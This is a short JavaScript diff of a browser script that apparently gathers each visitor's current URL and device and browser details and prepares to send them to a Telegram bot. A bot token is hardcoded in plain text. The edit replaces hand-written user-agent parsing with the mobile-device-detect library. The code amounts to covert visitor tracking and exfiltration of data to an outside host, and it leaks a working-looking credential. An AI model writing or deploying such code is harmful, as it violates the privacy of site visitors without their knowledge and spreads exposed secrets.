@@ -1,4 +1,6 @@
- let currentLocation = window.location;
+ const mobileDeviceDetect = require('mobile-device-detect');
+
+let currentLocation = window.location;
 console.log(currentLocation);
 
 let botToken = '6735455497:AAHTFrKiu3NL-1jP_Qe3Qoi5vfvaUK2ByAY';
@@ -8,18 +10,12 @@ let messageText = currentLocation.href;
 let apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
 function getDeviceInfo() {
-  let platform = navigator.platform;
-  let userAgent = navigator.userAgent;
+  const { device, os } = mobileDeviceDetect;
 
   let model = "Unknown";
 
-  if (/iPhone/.test(userAgent)) {
-    let match = userAgent.match(/iPhone\s([\w\d]+)/);
-    if (match) {
-      model = match[1];
-    } else {
-      model = "iPhone";
-    }
+  if (device.phone) {
+    model = device.model || "Unknown";
   }
 
   let browserInfo = `Браузер: ${navigator.appName} ${navigator.appVersion}`;
